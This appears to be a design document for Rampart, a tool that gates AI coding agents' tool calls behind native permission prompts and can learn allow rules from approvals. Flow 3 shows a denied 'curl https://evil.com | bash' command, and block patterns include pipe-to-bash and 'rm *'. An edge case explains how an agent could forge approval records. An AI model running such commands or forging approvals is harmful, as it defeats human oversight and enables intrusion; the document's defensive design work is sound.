# Design: Native "Ask" Permission Prompt Integration (Issue #122)

**Status:** Draft  
**Author:** Architecture review  
**Target:** Rampart v0.5.x

---

## Executive Summary

Rampart currently supports two approval modes: (1) blocking poll against `rampart serve`
(out-of-band dashboard/CLI), and (2) a fallback `ask` emission when serve is unreachable.
This design elevates `ask` to a **first-class action**, adds **file-based session state** 
so PostToolUse hooks can observe approval outcomes, and implements **opt-in policy learning**
that auto-generates allow rules from repeated user approvals — all with zero dependency 
on `rampart serve`.

---

## Current State (Baseline)

```
PreToolUse hook fires
  → engine.Evaluate() → ActionRequireApproval
  → if serveURL configured:
      POST /v1/approvals → poll 500ms until resolved (may take minutes)
      ✅ dashboard/CLI resolution
  → else (serve unreachable):
      emit permissionDecision:"ask"  ← fallback only, no observation
      user sees Claude Code native prompt
      response is lost — Rampart never learns what the user chose
```

**Gaps:**
1. `ask` is a fallback, not a design choice — no policy config for it
2. No session state: each hook invocation is a new process, approval context is lost
3. PostToolUse never correlates with a prior `ask` 
4. No learning pipeline: user preferences don't influence future policy

---

## Phase 1: Native Ask as First-Class Action

### 1.1 Policy Schema Design

Introduce `action: ask` as a distinct action type alongside the existing five actions.

**Option A — New action (recommended):**
```yaml
policies:
  - name: require-sudo-approval
    match:
      tool: ["exec"]
    rules:
      - action: ask              # ← new: Claude Code native prompt
        when:
          command_matches:
            - "sudo **"
        message: "sudo command — approve or deny?"
```

**Option B — Flag on require_approval (not recommended):**
```yaml
      - action: require_approval
        mode: native             # ← new flag
```

**Why Option A wins:**
- Clear semantic split: `ask` = native inline prompt, `require_approval` = external workflow
- `require_approval` semantics unchanged — zero migration friction
- Linting can warn if `require_approval` is used without `rampart serve` configured
- Single source of truth in the action enum

**engine/decision.go changes:**
```go
// ActionAsk emits Claude Code's native permission dialog inline.
// User sees: [Allow once] [Allow for session] [Always allow] [Deny]
// No dependency on rampart serve. Response is observed via PostToolUse.
// On Cline and other non-Claude Code agents, falls back to deny.
ActionAsk
```

`ParseAction()` gains `case "ask": return ActionAsk, nil`.

**Backwards compatibility:** `require_approval` remains. Users can migrate at their own pace.
Lint warning added: "require_approval without rampart serve configured uses native prompt — consider action: ask".

---

### 1.2 Hook Protocol: Exact JSON Format

**PreToolUse response (emit ask):**
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "ask",
    "permissionDecisionReason": "Rampart: sudo command — approve or deny?"
  }
}
```

This is already implemented as `hookAsk`. The only change is making it trigger from
`ActionAsk` in addition to the serve-fallback path.

**PostToolUse input (what Claude Code sends back):**
```json
{
  "hook_event_name": "PostToolUse",
  "session_id": "abc123",
  "tool_use_id": "toolu_01XyzAbc...",
  "tool_name": "Bash",
  "tool_input": { "command": "sudo apt install git" },
  "tool_response": { "stdout": "...", "stderr": "..." },
  "permission_mode": "default"
}
```

Key fields for Phase 2:
- `tool_use_id`: correlates with the PreToolUse that emitted `ask`
- `permission_mode`: Claude Code's overall permission setting (not the dialog response)
- Presence of `tool_response`: means the tool ran — user said allow (once or session or always)

**What we CANNOT observe directly:**  
Claude Code does NOT reflect which button the user clicked ("Allow once" vs "Always allow")
in the PostToolUse hook payload. We infer behavior from call patterns over time (see Phase 2).

---

### 1.3 Session State File

Because each hook invocation is a fresh process, session state must be persisted to disk.

**Location:** `~/.rampart/session-state/{session_id}.json`  
**Format:**
```json
{
  "session_id": "abc123",
  "created_at": "2026-02-26T21:00:00Z",
  "last_active": "2026-02-26T21:15:00Z",
  "pending_asks": {
    "toolu_01XyzAbc": {
      "tool": "exec",
      "command": "sudo apt install git",
      "generalized_pattern": "sudo apt install *",
      "asked_at": "2026-02-26T21:14:55Z",
      "policy_name": "require-sudo-approval",
      "decision_message": "sudo command — approve or deny?"
    }
  },
  "session_approvals": {
    "exec:sudo apt install *": {
      "first_approved": "2026-02-26T21:14:58Z",
      "last_approved": "2026-02-26T21:14:58Z",
      "approval_count": 1
    }
  }
}
```

**File lifecycle:**
- Created on first `ask` emission for a new `session_id`
- Updated on every PreToolUse (ask) and PostToolUse (approval observation)
- Deleted automatically after 24h of inactivity (background cleanup on hook startup)
- Max file size: 64KB (enforced; trim oldest entries if exceeded)

**Concurrency:** Atomic write via temp-file + rename (same pattern as `persist.go`).
File locking via O_EXCL on the temp file to handle concurrent hook invocations.

---

### 1.4 Hook Flow (Updated)

```
PreToolUse fires
  → Parse input: extract session_id, tool_use_id, tool, params
  → engine.Evaluate() → ActionAsk
  → Load/create session state file for session_id
  → Write pending_asks[tool_use_id] = {tool, command, pattern, asked_at}
  → Save session state
  → Emit: permissionDecision:"ask", permissionDecisionReason:"Rampart: ..."
  → Exit 0

User sees Claude Code native dialog:
  [🔒 Allow once]  [🔄 Allow for session]  [✅ Always allow]  [❌ Deny]

PostToolUse fires (if user allowed)
  → Parse input: extract session_id, tool_use_id, tool_response
  → Load session state for session_id
  → Look up pending_asks[tool_use_id]
  → If found: user approved this ask!
    → Move to session_approvals[pattern], increment count
    → Remove from pending_asks
    → If learn.enabled: check approval_count >= learn.threshold
      → Auto-generate allow rule (see Phase 2)
    → Save session state
  → Continue with normal PostToolUse evaluation (response scanning, etc.)
  → Exit 0

PostToolUse fires (if user denied)
  → tool_response will be absent or empty
  → OR: hook_event_name == "PostToolUseFailure"
  → Look up pending_asks[tool_use_id], log as denied
  → Remove from pending_asks
  → Save session state
```

---

## Phase 2: Policy Learning from Approvals

### 2.1 Learning Configuration

**~/.rampart/config.yaml** (new top-level config file, separate from policy YAML):
```yaml
learn:
  enabled: false              # opt-in; explicit consent required
  threshold: 3               # approve N times before auto-generating rule
  policy_file: "~/.rampart/policies/learned.yaml"
  audit_file: "~/.rampart/audit/learned-rules.jsonl"
  max_rules: 100             # prevent unbounded growth
  exclude_tools: ["write", "edit"]  # never auto-learn writes
  exclude_patterns:          # never auto-learn these patterns
    - "sudo **"              # dangerous, always review
    - "rm *"
    - "curl * | *"
```

**Enable with:**
```bash
rampart config set learn.enabled true
rampart config set learn.threshold 2
```

Or edit `~/.rampart/config.yaml` directly. Config is validated on load.

**Audit trail** (immutable, append-only):
```jsonl
{"ts":"2026-02-26T21:20:00Z","event":"rule_learned","tool":"exec","pattern":"sudo apt install *","approval_count":3,"session_id":"abc123","policy_file":"learned.yaml"}
{"ts":"2026-02-26T21:20:01Z","event":"rule_rejected","tool":"exec","pattern":"sudo rm *","reason":"matches exclude_patterns:sudo **","session_id":"abc123"}
```

---

### 2.2 Auto-Allow Rule Generation

When `approval_count >= threshold`:

1. Call `engine.GenerateAllowRule(call)` (already implemented in `persist.go`)
2. Apply safety filters (see exclusions above)
3. Preview the rule in the audit log
4. Append to `learned.yaml` using `engine.AppendAllowRule()` (already implemented)
5. If `rampart serve` is running, trigger `/v1/policy/reload`

**Example learned.yaml output:**
```yaml
# Auto-generated by Rampart — do not edit manually.
# Last updated: 2026-02-26T21:20:00Z
version: "1"
default_action: deny
policies:
  - name: auto-allow-sudo-apt-20260226T212000Z
    # learned: 3 approvals in session abc123
    # first_approved: 2026-02-26T21:14:58Z
    match:
      tool: ["exec"]
    rules:
      - action: allow
        when:
          command_matches:
            - "sudo apt install *"
        message: "Auto-learned: user approved 3× in session abc123"
```

---

### 2.3 Detecting "Always Allow" vs "Allow Once"

**The limitation:** Claude Code does not expose which button was clicked in PostToolUse.

**The inference strategy:**

| Signal | Meaning |
|--------|---------|
| PostToolUse fires once for `tool_use_id` | User approved at least once (any button) |
| Same pattern approved again on next occurrence (new `tool_use_id`) | User chose "Allow once" (Claude Code asked again) |
| Pattern NOT re-asked in same session | User chose "Allow for session" or "Always allow" (Claude Code handles it) |
| Pattern asked again in a NEW session | User chose "Allow for session" (session-scoped, not permanent) |
| Pattern asked again in ANOTHER session AND approved | Learning candidate |

**Practical heuristic:**
- If we emit `ask` for pattern P and PostToolUse approves it: `session_approvals[P].count++`
- If we emit `ask` for pattern P AGAIN (new `tool_use_id`, same session): Claude Code didn't
  cache it → user chose "Allow once" last time
- After N total approvals across all sessions: generate allow rule

This means our `threshold` is a cross-session counter, not a single-session one.
The session state files enable this cross-session count via the `learned.yaml` dedup logic.

**Alternative: Explicit "Always Allow" detection**

If Claude Code ever exposes the clicked button in the hook payload (e.g., a future
`permission_decision_made: "always_allow"` field), we can add instant rule generation for 
that specific case. The design accommodates this by checking `permission_mode` in PostToolUse:

```go
// Future-proofing: if Claude Code adds explicit always-allow signal
if input.PermissionMode == "alwaysAllow" && wasAsked {
    generateAllowRuleImmediately(call, sessionID)
}
```

---

### 2.4 "Deny" Learning

When a user denies a prompt:
- Log the denial to audit (never auto-generate deny rules from native prompts — too risky)
- Increment `session_denials[pattern].count`
- Surface in `rampart report` as "frequently denied" — human can add explicit deny rule

We do NOT auto-generate deny rules. Users add those manually via `rampart block`.

---

## UX Flow Diagrams

### Flow 1: Happy Path — First-Time Ask

```
Claude Code terminal (user sees):                  Rampart (behind the scenes):
─────────────────────────────────────────────      ─────────────────────────────────────────
                                                   
Claude: "I'll install git now..."                  
                                                   ← PreToolUse fires
  ┌────────────────────────────────────────┐       ← ActionAsk triggered
  │  🔒 Rampart: Approval Required         │       ← Writes session state:
  │                                        │          pending_asks[tool_use_id]
  │  Bash: sudo apt install git           │       ← Emits permissionDecision:"ask"
  │  "sudo command — approve or deny?"    │       
  │                                        │       
  │  [Allow once] [Allow for session]     │       
  │  [Always allow]        [Deny]         │       
  └────────────────────────────────────────┘       

User clicks [Allow once]
                                                   ← PostToolUse fires
                                                   ← Reads session state
                                                   ← Finds pending_asks[tool_use_id]
                                                   ← session_approvals["sudo apt install *"].count = 1
                                                   ← Writes session state (updated)
                                                   ← learn.threshold = 3, count < 3 → no rule yet
                                                   
Claude: "Git installed successfully ✓"
```

### Flow 2: Learning Threshold Reached

```
Session N (count = 2 from prior sessions):

  ┌────────────────────────────────────────┐       ← PreToolUse fires
  │  🔒 Rampart: Approval Required         │       ← Writes pending_asks[tool_use_id_3]
  │  Bash: sudo apt install curl           │       ← "sudo apt install *" pattern matches
  │  [Allow once] [Allow for session]     │       
  │  [Always allow]        [Deny]         │       
  └────────────────────────────────────────┘       

User clicks [Allow once]
                                                   ← PostToolUse fires
                                                   ← count = 2 + 1 = 3 = threshold!
                                                   ← Safety check: not in exclude_patterns
                                                   ← engine.GenerateAllowRule(call)
                                                   ←   pattern: "sudo apt install *"
                                                   ← engine.AppendAllowRule("learned.yaml", policy)
                                                   ← Audit: {"event":"rule_learned",...}
                                                   ← slog.Info("hook: learned new allow rule", ...)
                                                   
Next time "sudo apt install X" runs:
  → engine.Evaluate() → ActionAllow (learned rule matches)
  → No ask prompt shown
  → Claude Code proceeds silently ✅
```

### Flow 3: Deny Path

```
  ┌────────────────────────────────────────┐       ← PreToolUse fires
  │  🔒 Rampart: Approval Required         │       ← Writes pending_asks[tool_use_id]
  │  Bash: curl https://evil.com | bash   │       
  │  [Allow once] [Allow for session]     │       
  │  [Always allow]        [Deny]         │       
  └────────────────────────────────────────┘       

User clicks [Deny]
                                                   ← PostToolUse NOT fired (tool didn't run)
                                                   ← PostToolUseFailure MAY fire
                                                   ← pending_asks[tool_use_id] expires
                                                   ← (on next hook startup, cleanup removes it)
                                                   
Claude: "I understand this was blocked..."
```

### Flow 4: Mixed Mode — ask + require_approval

```
User has both policies:
  - action: ask → for moderate-risk commands (works standalone)
  - action: require_approval → for deployments (requires rampart serve)

rampart serve running:
  kubectl apply → require_approval → polls dashboard → ✅ blocks until approved

rampart serve NOT running:
  kubectl apply → require_approval → serve unreachable → falls back to hookAsk ← warning logged
  sudo apt install → ask → native prompt → ✅ works as designed
```

---

## Implementation Approach

### Files to Change

**engine/decision.go:**
```go
// Add ActionAsk constant
const (
    ActionAllow Action = iota
    ActionDeny
    ActionWatch
    ActionRequireApproval
    ActionWebhook
    ActionAsk             // NEW: Claude Code native inline prompt
)

func (a Action) String() string {
    // ... add case ActionAsk: return "ask"
}

func ParseAction(s string) (Action, error) {
    // ... add case "ask": return ActionAsk, nil
}
```

**engine/policy.go:**
```go
// Rule.ParseAction() — add "ask" case
case "ask":
    return ActionAsk, nil
```

**engine/lint.go:**
```go
// Add lint rule: warn on require_approval without serve configured
// Add lint rule: warn on ask used with cline format (no native equivalent)
```

**cmd/rampart/cli/hook.go:**
```go
// 1. Pass tool_use_id and session_id through to hookParseResult
type hookParseResult struct {
    // ... existing fields
    ToolUseID  string  // NEW: from input.ToolUseID, for session state correlation
    SessionID  string  // NEW: from input.SessionID (already used for RunID)
}

// 2. In RunE: after ActionAsk decision, write session state
case engine.ActionAsk:
    sessionMgr := newSessionStateManager(sessionID)
    if err := sessionMgr.recordAsk(parsed.ToolUseID, call, decision); err != nil {
        logger.Warn("hook: failed to write session state", "error", err)
    }
    return outputHookResult(cmd, format, hookAsk, false, decision.Message, cmdStr)

// 3. In PostToolUse path: observe approval outcome
if isPostToolUse {
    sessionMgr := newSessionStateManager(parsed.SessionID)
    if err := sessionMgr.observePostToolUse(parsed.ToolUseID, call, learnCfg); err != nil {
        logger.Warn("hook: session state update failed", "error", err)
    }
}
```

**internal/session/ (NEW package):**
```go
package session

// State manages per-session approval tracking.
type State struct {
    SessionID       string                       `json:"session_id"`
    CreatedAt       time.Time                    `json:"created_at"`
    LastActive      time.Time                    `json:"last_active"`
    PendingAsks     map[string]PendingAsk        `json:"pending_asks"`
    SessionApprovals map[string]ApprovalRecord   `json:"session_approvals"`
}

type PendingAsk struct {
    Tool               string    `json:"tool"`
    Command            string    `json:"command,omitempty"`
    GeneralizedPattern string    `json:"generalized_pattern"`
    AskedAt            time.Time `json:"asked_at"`
    PolicyName         string    `json:"policy_name,omitempty"`
    DecisionMessage    string    `json:"decision_message,omitempty"`
}

type ApprovalRecord struct {
    Pattern        string    `json:"pattern"`
    Tool           string    `json:"tool"`
    FirstApproved  time.Time `json:"first_approved"`
    LastApproved   time.Time `json:"last_approved"`
    ApprovalCount  int       `json:"approval_count"`
}

// Manager handles load/save of session state files.
type Manager struct {
    dir       string      // ~/.rampart/session-state/
    sessionID string
    logger    *slog.Logger
}

func NewManager(sessionID string, logger *slog.Logger) *Manager
func (m *Manager) RecordAsk(toolUseID string, call engine.ToolCall, decision engine.Decision) error
func (m *Manager) ObserveApproval(toolUseID string, call engine.ToolCall, learnCfg *LearnConfig) error
func (m *Manager) Cleanup(maxAge time.Duration) error  // remove stale session files

// LearnConfig holds policy learning configuration.
type LearnConfig struct {
    Enabled         bool     `yaml:"enabled"`
    Threshold       int      `yaml:"threshold"`       // default: 3
    PolicyFile      string   `yaml:"policy_file"`     // default: ~/.rampart/policies/learned.yaml
    AuditFile       string   `yaml:"audit_file"`
    MaxRules        int      `yaml:"max_rules"`        // default: 100
    ExcludeTools    []string `yaml:"exclude_tools"`
    ExcludePatterns []string `yaml:"exclude_patterns"`
}
```

**cmd/rampart/cli/config.go (NEW):**
```go
// rampart config get/set for ~/.rampart/config.yaml
// rampart config get learn.enabled
// rampart config set learn.enabled true
// rampart config set learn.threshold 2
```

**cmd/rampart/cli/hook.go — cleanup integration:**
```go
// At top of RunE, before policy load:
// Cleanup stale session state files (fire-and-forget, best effort)
go func() {
    mgr := session.NewManager("", logger)
    _ = mgr.Cleanup(24 * time.Hour)
}()
```

### Rough Code Structure

```
internal/
  session/
    state.go        — State, PendingAsk, ApprovalRecord types + file I/O
    manager.go      — Manager: RecordAsk, ObserveApproval, Cleanup
    manager_test.go
    config.go       — LearnConfig + load from ~/.rampart/config.yaml
    config_test.go

cmd/rampart/cli/
  config.go         — `rampart config` subcommand (get/set/list)
  config_test.go
  hook.go           — pass ToolUseID/SessionID, ActionAsk handling, PostToolUse observation
```

### Migration / Rollout Plan

1. **v0.5.0-alpha**: `ActionAsk` engine constant, policy parsing, lint rule
2. **v0.5.0-beta**: Session state file (PreToolUse path only — write pending asks)
3. **v0.5.0-rc**: PostToolUse observation, `rampart config` command
4. **v0.5.0**: Phase 1 complete — native ask, session tracking, manual rule generation
5. **v0.5.1**: `learn.enabled` flag, `learned.yaml` auto-generation (opt-in)
6. **v0.5.2**: `rampart learn` command for reviewing/managing learned rules

---

## Edge Cases

### 1. User Denies

**What happens:**
- PreToolUse emitted `ask`, wrote `pending_asks[tool_use_id]`
- User clicked Deny
- Claude Code does NOT run the tool
- PostToolUse may not fire, or fires with empty `tool_response`
- PostToolUseFailure may fire

**Rampart handling:**
- Pending ask entry expires after 1h (session file TTL)
- On next session startup, cleanup removes it
- No deny rule generated (explicit policy decision)
- Logged in audit as `decision:"ask_denied"` (inferred from absence)

### 2. Session-Only Approvals

**Scenario:** User clicks "Allow for session" — Claude Code handles subsequent calls
internally (doesn't fire hook), so Rampart never sees count > 1 for this session.

**Rampart handling:**
- `approval_count` stays at 1 for this session
- Cross-session count accumulates slowly
- After `threshold` sessions with single approvals: rule generated
- This is correct behavior — user has explicitly chosen session-scoping, not permanent

### 3. rampart serve Not Running (ActionRequireApproval fallback)

**Current behavior:** Falls back to `hookAsk` with a warning.

**New behavior (with this design):**
- Emit `ask` via native prompt (same as `ActionAsk`)
- Also write session state (so observation works)
- Add stderr warning: `"⚠ rampart serve unreachable — using native ask prompt. Run 'rampart serve' for dashboard."`
- Log lint warning: suggest switching to `action: ask` explicitly

### 4. Cline and Other Non-Claude Code Agents

**Claude Code:** Full native ask UI — all 4 buttons.  
**Cline:** No native ask equivalent. `hookAsk` is treated as deny (`cancel: true`).  
**OpenClaw:** Could emit a Discord/chat message with approve buttons (see Future Extensibility).  
**MCP Proxy:** Block pending resolution via API.

**Policy configuration:**
```yaml
- name: sudo-approval
  match:
    agent: "claude-code"    # scoped to Claude Code only
    tool: ["exec"]
  rules:
    - action: ask
      when:
        command_matches: ["sudo **"]
      message: "sudo requires approval"

- name: sudo-approval-other-agents
  match:
    agent: "cline"           # separate rule for Cline
    tool: ["exec"]
  rules:
    - action: require_approval   # falls back to serve or deny
      when:
        command_matches: ["sudo **"]
      message: "sudo requires approval"
```

Or use the existing `require_approval` which automatically falls back gracefully per agent.

**Lint rule:** Warn if `action: ask` is used without agent scoping (may silently cancel on Cline).

### 5. Offline Mode / No Filesystem Access

**Session state write failure:**
- Write is best-effort: errors are logged but do not block the hook
- Falls back to stateless mode: ask prompt still works, just no learning
- Phase 2 (learning) is silently disabled if session state can't be written

### 6. Race Conditions (Concurrent Hook Invocations)

Claude Code can invoke hooks concurrently (multiple tool calls in flight).

**Session state file concurrency:**
- Atomic write: temp file + rename (already the pattern in `persist.go`)
- Retry on EEXIST (temp file lock): up to 3 retries with 5ms backoff
- Worst case: a concurrent write overwrites another's pending ask entry
  - Impact: one approval observation is lost (count not incremented)
  - Acceptable: count will eventually reach threshold via future approvals

### 7. Approval Forgery

**Can Claude Code forge approval?**

Yes: if the agent can write to `~/.rampart/session-state/`, it could add fake approval
records. This is mitigated by:
1. The `block-self-modification` policy in standard.yaml blocks writing to Rampart dirs
2. Session state is advisory (learning only) — it doesn't bypass existing deny rules
3. Learned rules go into a separate file reviewed by the user
4. `learn.enabled` defaults to `false` — explicit opt-in required
5. Audit log is append-only (best effort; not cryptographically sealed for Phase 1)

**Risk level:** Medium. Acceptable given the opt-in nature of learning and the existing
self-modification protection. Future mitigation: sign session state with a keypair derived 
from the Rampart token.

### 8. Policy Conflicts: learned.yaml vs. explicit deny

**Resolution:** Deny-wins model applies. Explicit deny rules in any policy always override
learned allow rules. The `learned.yaml` policies have a default priority of 100; users can
give explicit deny policies lower priority numbers to ensure they win.

```yaml
# In standard.yaml or custom policy:
- name: always-block-curl-pipe
  priority: 1   # high priority, wins over everything
  rules:
    - action: deny
      when:
        command_matches: ["curl * | bash"]
      message: "Never auto-learn pipe-to-bash commands"
```

### 9. rampart serve + ActionAsk Together

**Scenario:** User configures both `require_approval` policies (for dashboard workflow) AND
`action: ask` (for quick native prompts).

Both work independently:
- `require_approval` → serve → dashboard
- `ask` → native prompt → session state
- No conflict

If serve goes down, `require_approval` falls back to native ask (existing behavior, unchanged).

### 10. Large Session State Files

- Max file size: 64KB enforced on write
- If exceeded: trim `pending_asks` older than 30 minutes, then trim oldest `session_approvals`
- Log warning: `"hook: session state file exceeds 64KB, trimming old entries"`

---

## Future Extensibility

### Other Agents: OpenClaw

OpenClaw can implement native ask via Discord interactive components:

```
OpenClaw hook fires → ActionAsk
  → Instead of emitting permissionDecision:"ask"
  → Send Discord message:
    "🔒 Approval required: sudo apt install git
     [✅ Allow once] [🔄 Allow session] [♾️ Always] [❌ Deny]"
  → Block hook (exit code stays open? Or use serve as relay?)
  → User clicks button → Discord webhook → rampart serve → resolve
```

This requires either:
- A running serve instance (OpenClaw calls `/v1/approvals/`)
- OR a new "OpenClaw ask" mode that uses the OpenClaw gateway

The hook protocol extension would be:
```go
// ActionAskOpenClaw: like ActionAsk but routes through OpenClaw notification
// OpenClaw's hook handler intercepts this and sends a Discord message
ActionAskOpenClaw  // Future
```

Or simpler: add a `--ask-mode=native|openclaw|serve` flag to `rampart hook`.

### Cline: VS Code Extension

Cline's hook system could add a native "ask" capability via VS Code's notification API.
The Cline extension would show a modal dialog with the same buttons.

Protocol: `clineHookOutput` gains `{ "askPermission": true, "askReason": "..." }` —
Cline extension shows the modal and returns the user's choice to the hook.

This requires upstream Cline changes. Rampart would add support when available.

### Windsurf, Cursor, Amp, etc.

Each agent framework has its own hook/permission model:
- **Windsurf:** Similar to Claude Code hooks (check for `permissionDecision: "ask"` support)
- **Cursor:** Uses `.cursorrules` + tool use approval — needs investigation
- **Amp:** Has own hook system — map to Rampart's `ask` when available

The `format` flag in `rampart hook --format <agent>` is the extension point.
Adding `--format windsurf` etc. follows the same pattern as `--format cline`.

### Webhook-Based Ask

For non-interactive environments (CI, servers):

```yaml
- name: ci-approval
  match:
    session: "ci/*"
  rules:
    - action: webhook
      webhook:
        url: "https://approvals.example.com/rampart"
        # Webhook returns allow/deny — like existing webhook action
        # But with a timeout for human review
        timeout: "5m"
```

This already exists (`ActionWebhook`). No changes needed.

### Policy Versioning / Rollback

Learned rules are tagged with generation metadata:
```yaml
# Auto-generated by Rampart — do not edit manually.
# rampart-generated: v1, session: abc123, 2026-02-26
```

Future: `rampart learn rollback` reverts learned rules added since a checkpoint.
Future: Git-commit learned.yaml changes for version control.

### Telemetry (Opt-In)

If users consent, aggregate approval/denial patterns to improve Rampart's standard policy:
```yaml
telemetry:
  enabled: false       # always opt-in
  endpoint: "https://telemetry.rampart.sh/v1/approvals"
  include: ["tool", "generalized_pattern", "decision"]
  exclude: ["command", "path", "session_id"]  # never send specifics
```

---

## Implementation Checklist

### Phase 1
- [ ] `engine/decision.go`: Add `ActionAsk`, update `String()`, `ParseAction()`
- [ ] `engine/policy.go`: Add `"ask"` case to `Rule.ParseAction()`
- [ ] `engine/lint.go`: Warn if `ask` used without Claude Code agent scoping
- [ ] `internal/session/`: New package — `State`, `Manager`, `LearnConfig`
- [ ] `cmd/rampart/cli/hook.go`: Thread `ToolUseID` through `hookParseResult`
- [ ] `cmd/rampart/cli/hook.go`: Handle `ActionAsk` — write session state + emit `hookAsk`
- [ ] `cmd/rampart/cli/hook.go`: PostToolUse path — observe approval, update session state
- [ ] `cmd/rampart/cli/hook.go`: Stale session file cleanup (goroutine on startup)
- [ ] Tests: `internal/session/` unit tests (concurrency, cleanup, dedup)
- [ ] Tests: `hook_test.go` integration test for ask → session → postToolUse → count
- [ ] Docs: Update `README.md` with `action: ask` example
- [ ] Docs: Add `docs/guides/native-ask.md`

### Phase 2
- [ ] `cmd/rampart/cli/config.go`: `rampart config get/set` subcommand
- [ ] `internal/session/config.go`: `LearnConfig` load from `~/.rampart/config.yaml`
- [ ] `internal/session/manager.go`: `ObserveApproval()` → check threshold → generate rule
- [ ] `engine/persist.go`: Extend `GenerateAllowRule()` with comment metadata
- [ ] Audit log: append learning events to `~/.rampart/audit/learned-rules.jsonl`
- [ ] `cmd/rampart/cli/learn.go`: `rampart learn list/review/rollback` commands
- [ ] Tests: end-to-end test: 3 approvals → learned.yaml updated → allow fires
- [ ] Docs: `docs/guides/policy-learning.md`

---

## Summary

| Capability | Phase 1 | Phase 2 |
|---|---|---|
| `action: ask` in policy YAML | ✅ | ✅ |
| Native Claude Code prompt (no serve required) | ✅ | ✅ |
| Session state tracking (pending asks) | ✅ | ✅ |
| PostToolUse approval observation | ✅ | ✅ |
| Audit log of all ask/approve/deny events | ✅ | ✅ |
| Opt-in policy learning | ❌ | ✅ |
| Auto-generated allow rules | ❌ | ✅ |
| `rampart config` command | ❌ | ✅ |
| `rampart learn` command | ❌ | ✅ |
| Cline fallback (cancel on ask) | ✅ (existing) | ✅ |
| OpenClaw integration | ❌ | Future |
| Cross-session approval counting | ❌ | ✅ |

**The key insight:** Claude Code's `permissionDecision: "ask"` is already implemented as
`hookAsk`. The work is: (1) making it a first-class action in the policy schema, (2) adding 
the session state layer so PostToolUse can observe approval outcomes, and (3) building the
optional learning pipeline on top of that observation. The foundation is solid; Phase 1 is
mostly wiring and a new package, not new protocol work.
